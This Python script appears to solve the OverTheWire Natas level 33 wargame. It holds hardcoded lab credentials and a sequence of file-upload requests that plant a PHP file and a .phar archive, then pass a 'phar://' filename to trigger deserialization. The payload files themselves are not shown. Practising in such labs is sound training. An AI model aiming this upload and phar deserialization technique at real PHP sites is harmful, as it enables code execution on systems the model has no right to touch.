import requests
from requests.auth import HTTPBasicAuth
import json
import datetime
import time
import string
from urllib import parse
import base64
import urllib
import re


    
natasURL = 'http://natas33.natas.labs.overthewire.org/'
natas_usr   = 'natas33'
natas_pword = 'shoogeiGa2yee3de6Aex8uaXeech5eey'

r = requests.Session()


injection_url = natasURL
files1 = {'uploadedfile': 'pwn.php'}
resp = requests.post(injection_url, files=files1,
                     data={'filename': 'pwn.php', 'submit':'Upload File'},
                     auth=(natas_usr, natas_pword))
print(resp.text)

injection_url = natasURL
files1 = {'uploadedfile': 'test.phar'}
resp = requests.post(injection_url, files=files1,
                     data={'filename': 'test.phar', 'submit':'Upload File'},
                     auth=(natas_usr, natas_pword))
print(resp.text)


injection_url = natasURL
files1 = {'uploadedfile': 'test.phar'}
resp = requests.post(injection_url, files=files1,
                     data={'filename': 'phar://test.phar/test.txt', 'submit':'Upload File'},
                     auth=(natas_usr, natas_pword))
time.sleep(1.0)
print(resp.text)




